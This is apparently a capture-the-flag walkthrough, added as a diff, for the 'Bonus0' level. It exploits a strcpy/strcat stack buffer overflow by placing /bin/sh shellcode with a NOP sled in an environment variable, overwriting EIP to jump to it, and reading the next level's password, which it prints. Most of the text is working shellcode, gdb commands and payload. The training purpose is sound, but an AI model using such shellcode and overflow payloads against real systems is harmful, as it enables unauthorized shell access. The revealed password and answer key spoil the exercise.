@@ -1,0 +1,90 @@
+# Bonus0 - Buffer Overflow with Shellcode in Environment
+
+---
+
+# PART 1: Walkthrough
+
+## Step 1: Test the program
+
+```bash
+./bonus0
+ - 
+hello
+ - 
+world
+hello world
+```
+
+Program reads two inputs and concatenates them.
+
+## Step 2: Analyze functions
+
+```bash
+gdb bonus0
+(gdb) disas main
+(gdb) disas pp
+(gdb) disas p
+```
+
+**Key findings:**
+- `p` uses `read` (4096 bytes max), `strchr`, `strncpy` (20 bytes)
+- `pp` calls `p` twice, uses `strcpy` and `strcat` (vulnerable!)
+- `main` calls `pp` and prints result
+
+## Step 3: Find the offset
+
+```bash
+(gdb) run
+ - 
+AAAABBBBCCCCDDDDEEEE
+ - 
+AAAABBBBCCCCDDDDEEEE
+
+Program received signal SIGSEGV, Segmentation fault.
+0x44434343 in ?? ()
+```
+
+EIP = `0x44434343` (DCCC) → Offset **9** from second input.
+
+## Step 4: Export shellcode
+
+```bash
+export SHELLCODE=$(python -c 'print "\x90"*500+"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"')
+```
+
+## Step 5: Find shellcode address
+
+```bash
+gdb bonus0
+(gdb) break main
+(gdb) run
+(gdb) x/500s environ
+```
+
+Look for `SHELLCODE=\x90\x90\x90...` in output.
+
+**Example:** `0xbffff6db: "SHELLCODE=\220\220\220..."`
+
+Choose an address in the middle of NOPs: `0xbffff750`
+
+## Step 6: Build the payload
+
+```bash
+python -c 'print "B"*4095+"\n"+"A"*9+"\x50\xf7\xff\xbf"+"B"*30' > /tmp/payload_b0
+```
+
+## Step 7: Execute
+
+```bash
+cat /tmp/payload_b0 - | ./bonus0
+```
+
+Then:
+```bash
+whoami
+cat /home/user/bonus1/.pass
+```
+
+**Password:** `cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9`
+
+---
